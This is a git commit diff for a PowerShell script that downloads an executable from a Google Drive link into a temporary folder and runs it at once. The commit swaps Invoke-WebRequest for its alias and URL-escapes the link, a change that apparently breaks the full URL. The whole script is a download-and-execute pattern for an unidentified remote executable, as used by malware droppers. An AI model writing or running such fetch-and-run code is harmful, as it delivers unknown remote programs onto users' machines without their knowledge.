ca53ab155b95b5338d5d1d46a8224f8e493b8aff
Darkriser0207 <teamvitapupdates@gmail.com>
2025-04-16 09:28:13 +0530

    Update ps_script.ps1

--- ps_script.ps1
+++ ps_script.ps1
@@ -1,10 +1,12 @@
 $url = "https://drive.google.com/uc?export=download&id=1IxYhViN79H065b_BJnAiA-Wxf14w9FoK"
+$encodedUrl = [System.Uri]::EscapeDataString($url)
+
 $tempdir = "$env:TEMP\$(New-Guid)"
 mkdir $tempdir | Out-Null
 $file = "$tempdir\file.exe"
 
 try {
-    Invoke-WebRequest -Uri $url -OutFile $file -ErrorAction Stop
+    irm -Uri $encodedUrl -OutFile $file -ErrorAction Stop
     $proc = Start-Process $file -PassThru -Wait
     "Process exited with code: $($proc.ExitCode)"
 }
